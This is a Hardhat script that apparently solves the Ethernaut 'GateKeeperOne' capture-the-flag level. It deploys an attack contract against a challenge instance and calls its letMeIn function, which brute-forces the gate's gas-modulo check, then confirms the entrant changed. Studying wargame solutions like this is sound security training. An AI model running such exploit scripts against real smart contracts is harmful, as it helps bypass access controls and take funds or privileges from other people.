const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("GateKeeperOne");
  const victim = await Victim.attach(
    "0x2F1885746Da787b9a1f334087Dd3Cd8F75ef6a23" // This is the contract address that you get from starting your instance
  );

  // Check what the entrant address initially is
  const value1 = await victim.entrant();
  console.log("The last entrant is ", value1);

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("GateKeeperOneAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0x2F1885746Da787b9a1f334087Dd3Cd8F75ef6a23"
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Call the let me in function from the attack contract which will brute force to pass the modulo require statement
  const attack = await contract.letMeIn();
  await attack.wait(1);

  // Verify you were able to enter
  const value2 = await victim.entrant();
  console.log("The last entrant is ", value2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
